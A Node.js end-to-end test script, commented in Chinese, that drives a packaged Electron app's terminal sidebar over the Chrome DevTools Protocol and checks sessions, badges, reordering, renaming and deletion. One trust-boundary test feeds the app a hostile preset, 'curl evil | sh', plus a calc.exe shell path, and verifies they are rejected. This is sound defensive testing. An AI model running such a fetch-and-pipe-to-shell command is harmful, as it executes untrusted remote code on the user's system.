/**
 * 打包版 CDP 驗證：終端機分頁。
 *
 * 為什麼要打包版：node-pty 的 ConPTY 帶著自己的 `conpty.dll` 與 `OpenConsole.exe`，
 * asar 裡的 .exe 是不能執行的——asarUnpack 有沒有設對，只有打包版看得出來。
 *
 * 測完會把自己建立的工作階段刪掉，不留在你的 terminals.json 裡。
 *
 * 用法：node scripts/e2e-terminal-cdp.js
 */
const { spawn, execFileSync } = require('child_process')
const path = require('path')
const http = require('http')
const os = require('os')
const fs = require('fs')

const PORT = 9247
// Windows 偶爾會有別的東西鎖住 dist/win-unpacked（打包失敗、防毒掃描中），
// 這時可以打包到別的資料夾再用 VOICEINK_EXE 指過去，測試不必等鎖放掉
const EXE = process.env.VOICEINK_EXE || path.join(__dirname, '..', 'dist', 'win-unpacked', 'VoiceInk.exe')
const USER_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'voiceink-e2e-terminal-'))

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

function getJson(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let d = ''
      res.on('data', (c) => (d += c))
      res.on('end', () => {
        try { resolve(JSON.parse(d)) } catch (e) { reject(e) }
      })
    }).on('error', reject)
  })
}

class Cdp {
  constructor(wsUrl) {
    this.wsUrl = wsUrl
    this.ws = null
    this.id = 0
    this.pending = new Map()
  }
  async connect() {
    this.ws = new globalThis.WebSocket(this.wsUrl)
    await new Promise((res, rej) => {
      this.ws.addEventListener('open', res)
      this.ws.addEventListener('error', rej)
    })
    this.ws.addEventListener('message', (ev) => {
      const msg = JSON.parse(ev.data)
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id)
        this.pending.delete(msg.id)
        if (msg.error) reject(new Error(msg.error.message))
        else resolve(msg.result)
      }
    })
    this.ws.addEventListener('close', () => {
      for (const { reject } of this.pending.values()) reject(new Error('CDP 連線已關閉'))
      this.pending.clear()
    })
  }
  send(method, params = {}) {
    const id = ++this.id
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject })
      this.ws.send(JSON.stringify({ id, method, params }))
    })
  }
  async eval(expression) {
    const r = await this.send('Runtime.evaluate', {
      expression, awaitPromise: true, returnByValue: true
    })
    if (r.exceptionDetails) {
      const d = r.exceptionDetails
      throw new Error(d.exception?.description || d.exception?.value || d.text || 'eval error')
    }
    return r.result?.value
  }
  close() { try { this.ws.close() } catch { /* 已斷線 */ } }
}

async function waitTargets(timeoutMs = 30000) {
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    try {
      const list = await getJson(`http://127.0.0.1:${PORT}/json/list`)
      const pages = list.filter((t) => t.type === 'page')
      if (pages.length) return pages
    } catch { /* 還沒起來 */ }
    await sleep(400)
  }
  throw new Error('timeout waiting for CDP targets')
}

function stopTestApp(child) {
  if (!child?.pid) return
  try {
    execFileSync('taskkill', ['/PID', String(child.pid), '/T', '/F'], { stdio: 'ignore' })
  } catch { /* 程序已結束 */ }
}

/**
 * 在頁面裡等一個條件成立。
 * @param {Cdp} cdp
 * @param {string} expression 回傳布林的表達式
 */
async function waitInPage(cdp, expression, timeoutMs = 20000) {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    if (await cdp.eval(`(() => { try { return !!(${expression}) } catch { return false } })()`)) return true
    await sleep(300)
  }
  return false
}

async function main() {
  const results = []
  const ok = (name, pass, detail = '') => {
    results.push({ name, pass: !!pass })
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? ' — ' + detail : ''}`)
  }

  const child = spawn(EXE, [
    `--remote-debugging-port=${PORT}`,
    `--user-data-dir=${USER_DATA_DIR}`,
    '--hidden',
    '--disable-backgrounding-occluded-windows'
  ], { stdio: 'ignore' })
  /** 測試自己建立的工作階段 id，收尾要刪掉（兩個都要，中途失敗才不會留下垃圾） */
  let createdId = ''
  let secondId = ''
  let cdp = null

  try {
    const pages = await waitTargets()
    // 指名主視窗：語音輸入開著時還會有一扇指示器視窗
    const mainPage = pages.find((p) => /index\.html/i.test(p.url)) || pages[0]
    cdp = new Cdp(mainPage.webSocketDebuggerUrl)
    await cdp.connect()
    await cdp.send('Runtime.enable')
    await sleep(1200)

    // 只縮小本測試建立的暫存 App，不碰使用者正在使用的安裝版。
    await cdp.eval('window.electronAPI.window.minimize()')
    ok('測試視窗在背景狀態啟動', await waitInPage(cdp, 'document.hidden === true'),
      await cdp.eval('String(document.hidden)'))
    await cdp.eval(`(async () => {
  const { Terminal } = await import('../../node_modules/@xterm/xterm/lib/xterm.mjs')
      const originalWrite = Terminal.prototype.write
      window.__termAsyncWrites = 0
      Terminal.prototype.write = function (...args) {
        window.__termAsyncWrites += 1
        return originalWrite.apply(this, args)
      }
    })()`)

    // ===== 分頁本身 =====
    const nav = await cdp.eval(`(() => ({
      order: [...document.querySelectorAll('.nav-tab')].map((b) => b.dataset.page),
      termNewBtn: !!document.getElementById('termNewBtn')
    }))()`)
    // 終端機已併入聊天頁：nav 不再有 terminal 分頁，側欄上半對話、下半終端機
    ok('nav 八個分頁、聊天排第一、沒有 terminal 分頁',
      nav.order.length === 8 && nav.order[0] === 'chat' && !nav.order.includes('terminal'), JSON.stringify(nav.order))
    ok('側欄有「＋新終端機」按鈕', nav.termNewBtn)

    await cdp.eval(`document.querySelector('.nav-tab[data-page="chat"]').click()`)
    ok('聊天與終端機同一頁', await waitInPage(cdp, `document.getElementById('page-chat').classList.contains('active')`))
    ok('模組載入完成（側欄畫出來了）',
      await waitInPage(cdp, `document.getElementById('termList').children.length > 0`))
    ok('沒有 renderer 例外（xterm 的 ESM 從 node_modules 載得起來）',
      await cdp.eval(`typeof window.__termLoadError === 'undefined'`))

    // ===== 新終端機 =====
    const shells = await cdp.eval(`(async () => {
      document.getElementById('termNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      const dialog = document.getElementById('termNewDialog')
      return {
        open: dialog.open,
        shells: [...document.getElementById('termShellSelect').options].map((o) => o.value),
        presets: [...document.getElementById('termPresetSelect').options].map((o) => o.value)
      }
    })()`)
    ok('新終端機彈窗打得開', shells.open)
    ok('shell 選單有三種', shells.shells.length === 3, JSON.stringify(shells.shells))
    ok('啟動指令有 claude／codex', shells.presets.includes('claude') && shells.presets.includes('codex'),
      JSON.stringify(shells.presets))

    const created = await cdp.eval(`(async () => {
      document.getElementById('termNewCreateBtn').click()
      await new Promise((r) => setTimeout(r, 2500))
      const list = await window.electronAPI.terminal.list()
      const item = list.data[list.data.length - 1]
      return {
        id: item.id,
        title: item.title,
        state: item.state,
        dialogClosed: !document.getElementById('termNewDialog').open,
        hostVisible: !document.getElementById('termHost').classList.contains('hidden'),
        panes: document.querySelectorAll('.term-pane').length,
        rows: document.querySelectorAll('.xterm-rows').length
      }
    })()`)
    createdId = created.id
    ok('建立後彈窗關閉、畫布顯示', created.dialogClosed && created.hostVisible, JSON.stringify(created))
    ok('xterm 真的掛上去了', created.panes === 1 && created.rows === 1, JSON.stringify(created))

    // 回歸：背景頁的 DOM 不會繪製 xterm；確認 prompt 已到 main buffer，且 renderer
    // 沒走會被背景 timer 節流的非同步 write。舊版在這裡會至少呼叫一次 write。
    const firstOutput = await cdp.eval(`(async () => {
      for (let i = 0; i < 25; i += 1) {
        const result = await window.electronAPI.terminal.open(${JSON.stringify(createdId)}, 80, 24)
        const buffer = result?.data?.buffer || ''
        if (buffer.trim().length > 3) return { buffer: buffer.slice(0, 80), asyncWrites: window.__termAsyncWrites }
        await new Promise((r) => setTimeout(r, 200))
      }
      return { buffer: '', asyncWrites: window.__termAsyncWrites }
    })()`)
    ok('背景首段 PTY 輸出不依賴非同步 write',
      firstOutput.buffer.trim().length > 3 && firstOutput.asyncWrites === 0,
      JSON.stringify(firstOutput))

    // ===== 狀態徽章 =====
    // shell integration 的第一個標記要先落地，再送指令才判得準
    await sleep(2000)
    await cdp.eval(`window.electronAPI.terminal.write(${JSON.stringify(createdId)}, 'ping -n 5 127.0.0.1\\r')`)
    ok('送出指令後側欄變成「運行中」', await waitInPage(
      cdp,
      `document.querySelector('.term-list-item.active .term-state').textContent === '運行中'`,
      6000
    ), await cdp.eval(`document.querySelector('.term-list-item.active .term-state')?.textContent || '(無)'`))

    ok('跑完變成「已完成」', await waitInPage(
      cdp,
      `document.querySelector('.term-list-item.active .term-state').textContent.startsWith('已完成')`,
      20000
    ), await cdp.eval(`document.querySelector('.term-list-item.active .term-state')?.textContent || '(無)'`))

    // ===== 未讀點之一：人在別的主區（對話）時跑完 =====
    // 合頁後沒有「別的分頁」：切到某個對話＝使用者離開終端機主區。
    // 這個 user-data-dir 是全新的，側欄本來沒有對話，得自己開一個（用完刪掉）。
    // 注意：終端機列也帶 `.chat-list-item`，選擇器一定要限定在 `#chatList` 裡面。
    const away = await cdp.eval(`(async () => {
      document.getElementById('chatNewBtn').click()
      await new Promise((r) => setTimeout(r, 900))
      const row = document.querySelector('#chatList .chat-list-item')
      const chatId = row?.dataset.id || ''
      row?.querySelector('.chat-list-open')?.click()
      await new Promise((r) => setTimeout(r, 500))
      const leftTerminal = document.getElementById('termMain').classList.contains('hidden')
      await window.electronAPI.terminal.write(${JSON.stringify(createdId)}, 'echo away\\r')
      await new Promise((r) => setTimeout(r, 3500))
      const dots = document.querySelectorAll('.term-unread').length
      // 點側欄的終端機項目回到終端機主區（同時清掉未讀點）
      document.querySelector('.term-list-item[data-id="${createdId}"] .chat-list-open').click()
      await new Promise((r) => setTimeout(r, 800))
      await window.electronAPI.chat.delete(chatId)
      return { chatId, leftTerminal, dots, after: document.querySelectorAll('.term-unread').length }
    })()`)
    ok('人在對話主區時跑完也會亮未讀點',
      away.leftTerminal && away.dots > 0 && away.after === 0, JSON.stringify(away))

    // ===== 未讀點之二：另一個階段跑完，而使用者正在看的是這一個 =====
    // 這是「哪個代理做完了」的核心提示，要真的開第二個階段才測得到。
    const second = await cdp.eval(`(async () => {
      // 走 UI 開第二個（renderer 的清單才會同步），開完再切回第一個當作「正在看的那個」
      document.getElementById('termNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      document.getElementById('termNewCreateBtn').click()
      await new Promise((r) => setTimeout(r, 3000))
      const list = await window.electronAPI.terminal.list()
      const id = list.data[list.data.length - 1].id
      // 一律指名自己建的那個，不要抓「第一列」：使用者本來就有的工作階段會排在前面
      document.querySelector('.term-list-item[data-id="${createdId}"] .chat-list-open').click()
      await new Promise((r) => setTimeout(r, 600))
      return id
    })()`)
    secondId = second
    await cdp.eval(`window.electronAPI.terminal.write(${JSON.stringify(second)}, 'ping -n 4 127.0.0.1\\r')`)
    ok('背景階段跑完會亮未讀點', await waitInPage(
      cdp,
      `[...document.querySelectorAll('.term-list-item')]
         .filter((el) => !el.classList.contains('active'))
         .some((el) => el.querySelector('.term-unread'))`,
      20000
    ), await cdp.eval(`document.querySelectorAll('.term-unread').length + ' 個未讀點'`))

    ok('點開那一列就把未讀點清掉', await cdp.eval(`(async () => {
      const el = [...document.querySelectorAll('.term-list-item')]
        .find((node) => node.querySelector('.term-unread'))
      if (!el) return false
      el.querySelector('.chat-list-open').click()
      await new Promise((r) => setTimeout(r, 900))
      return document.querySelectorAll('.term-unread').length === 0
    })()`))

    // ===== 側欄排序（此時剛好有兩列）=====
    const dragged = await cdp.eval(`(async () => {
      const before = (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      const rows = [...document.querySelectorAll('.term-list-item')]
      if (rows.length < 2) return { skipped: rows.length }
      const second = rows[1]
      const rA = rows[0].getBoundingClientRect()
      const rB = second.getBoundingClientRect()
      const at = (x, y) => ({ bubbles: true, button: 0, clientX: x, clientY: y })
      second.dispatchEvent(new PointerEvent('pointerdown', at(rB.left + 20, rB.top + 10)))
      window.dispatchEvent(new PointerEvent('pointermove', at(rB.left + 20, rB.top + 2)))
      window.dispatchEvent(new PointerEvent('pointermove', at(rA.left + 20, rA.top + 4)))
      window.dispatchEvent(new PointerEvent('pointerup', at(rA.left + 20, rA.top + 4)))
      await new Promise((r) => setTimeout(r, 900))
      const after = (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      return { before, after, dom: [...document.querySelectorAll('.term-list-item')].map((el) => el.dataset.id) }
    })()`)
    ok('拖曳可以調換側欄順序，而且真的存回 main',
      dragged.after && dragged.after[0] === dragged.before[1] &&
      JSON.stringify(dragged.after) === JSON.stringify(dragged.dom),
      JSON.stringify(dragged))

    const byKeyboard = await cdp.eval(`(async () => {
      const rows = [...document.querySelectorAll('.term-list-item')]
      if (rows.length < 2) return { skipped: true }
      const before = (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      rows[1].dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowUp', altKey: true, bubbles: true }))
      await new Promise((r) => setTimeout(r, 900))
      const after = (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      return { before, after }
    })()`)
    ok('Alt+↑ 也能排序', byKeyboard.after && byKeyboard.after[0] === byKeyboard.before[1],
      JSON.stringify(byKeyboard))

    // 第二個階段用完了，走 UI 刪掉（畫布也要跟著收），再把第一個切回來
    const cleaned = await cdp.eval(`(async () => {
      const el = document.querySelector('.term-list-item[data-id="${second}"]')
      if (!el) return { found: false }
      const btns = el.querySelectorAll('.chat-list-btn')
      btns[btns.length - 1].click()
      await new Promise((r) => setTimeout(r, 200))
      btns[btns.length - 1].click()
      await new Promise((r) => setTimeout(r, 1200))
      document.querySelector('.term-list-item[data-id="${createdId}"] .chat-list-open').click()
      await new Promise((r) => setTimeout(r, 800))
      return {
        found: true,
        secondPane: !!document.querySelector('.term-pane[data-id="${second}"]'),
        firstPane: !!document.querySelector('.term-pane[data-id="${createdId}"]'),
        err: document.getElementById('termError')?.textContent || '',
        listAfter: (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      }
    })()`)
    ok('刪掉背景階段後畫布也收乾淨',
      cleaned.found && !cleaned.secondPane && cleaned.firstPane, JSON.stringify(cleaned))
    secondId = ''

    // ===== 切走再切回來，畫面還在 =====
    const kept = await cdp.eval(`(async () => {
      const rows = () => document.querySelector('.term-pane[data-id="${createdId}"] .xterm-rows')
      const before = rows().textContent.length
      document.querySelector('.nav-tab[data-page="usage"]').click()
      await new Promise((r) => setTimeout(r, 500))
      // 終端機跟聊天同頁：點側欄的終端機項目切回終端機主區
      document.querySelector('.term-list-item')?.click()
      await new Promise((r) => setTimeout(r, 600))
      const pane = document.querySelector('.term-pane[data-id="${createdId}"]')
      return { before, after: rows().textContent.length, active: pane.classList.contains('is-active') }
    })()`)
    ok('切走再切回來畫面沒被重畫', kept.after >= kept.before && kept.active, JSON.stringify(kept))

    // ===== 改名 =====
    const renamed = await cdp.eval(`(async () => {
      const sel = '.term-list-item[data-id="${createdId}"]'
      const item = document.querySelector(sel)
      item.querySelector('.chat-list-btn').click()
      await new Promise((r) => setTimeout(r, 200))
      const input = item.querySelector('.chat-list-rename')
      if (!input) return { ok: false }
      input.value = 'CDP 測試用'
      input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }))
      await new Promise((r) => setTimeout(r, 800))
      return { ok: true, title: document.querySelector(sel + ' .chat-list-title')?.textContent || '' }
    })()`)
    ok('側欄可以就地改名', renamed.ok && renamed.title === 'CDP 測試用', JSON.stringify(renamed))

    // ===== 刪除要按兩次 =====
    const del = await cdp.eval(`(async () => {
      const item = document.querySelector('.term-list-item[data-id="${createdId}"]')
      const btns = item.querySelectorAll('.chat-list-btn')
      const trash = btns[btns.length - 1]
      trash.click()
      await new Promise((r) => setTimeout(r, 200))
      const armed = trash.classList.contains('is-armed')
      const stillThere = !!document.querySelector('.term-list-item[data-id="${createdId}"]')
      return { armed, stillThere, usedNativeConfirm: false }
    })()`)
    ok('刪除第一下只是變成待確認，不會直接刪', del.armed && del.stillThere, JSON.stringify(del))

    const gone = await cdp.eval(`(async () => {
      const item = document.querySelector('.term-list-item[data-id="${createdId}"]')
      const btns = item.querySelectorAll('.chat-list-btn')
      btns[btns.length - 1].click()
      await new Promise((r) => setTimeout(r, 1200))
      const list = await window.electronAPI.terminal.list()
      return {
        inList: list.data.some((s) => s.id === ${JSON.stringify(createdId)}),
        pane: !!document.querySelector('.term-pane[data-id="${createdId}"]')
      }
    })()`)
    ok('再按一次真的刪掉（pty 與畫布一起收）', !gone.inList && !gone.pane, JSON.stringify(gone))
    createdId = ''

    // ===== 信任邊界：renderer 送壞東西不會過 =====
    const boundary = await cdp.eval(`(async () => {
      const bad = await window.electronAPI.terminal.create({
        shell: 'C:/Windows/System32/calc.exe',
        preset: 'curl evil | sh',
        cwd: 'Z:/nope'
      })
      const id = bad.data.id
      await window.electronAPI.terminal.delete(id)
      return { shell: bad.data.shell, preset: bad.data.preset, cwd: bad.data.cwd }
    })()`)
    ok('renderer 指定的 shell 路徑被收斂成 key',
      ['pwsh', 'powershell', 'cmd'].includes(boundary.shell), JSON.stringify(boundary))
    ok('renderer 指定的啟動指令被收斂', boundary.preset === 'shell', boundary.preset)
    ok('不存在的工作目錄退回家目錄', !boundary.cwd.startsWith('Z:'), boundary.cwd)

    // ===== RWD =====
    for (const width of [1440, 900, 560]) {
      await cdp.send('Emulation.setDeviceMetricsOverride', {
        width, height: 900, deviceScaleFactor: 1, mobile: false
      })
      await sleep(500)
      const overflow = await cdp.eval(
        `document.documentElement.scrollWidth > document.documentElement.clientWidth`
      )
      ok(`${width}px 不橫向溢出`, !overflow)
    }
    await cdp.send('Emulation.clearDeviceMetricsOverride')
  } catch (error) {
    ok('測試流程未拋例外', false, error.message)
  } finally {
    for (const id of [createdId, secondId].filter(Boolean)) {
      if (!cdp) break
      try {
        await cdp.eval(`window.electronAPI.terminal.delete(${JSON.stringify(id)})`)
        console.log(`（已清掉測試建立的工作階段 ${id}）`)
      } catch { /* App 可能已經關了 */ }
    }
    cdp?.close()
    stopTestApp(child)
    try { fs.rmSync(USER_DATA_DIR, { recursive: true, force: true }) } catch { /* 程序剛結束，稍後由系統清理 */ }
  }

  const failed = results.filter((r) => !r.pass)
  console.log(`\n${results.length - failed.length} passed, ${failed.length} failed`)
  process.exit(failed.length === 0 ? 0 : 1)
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
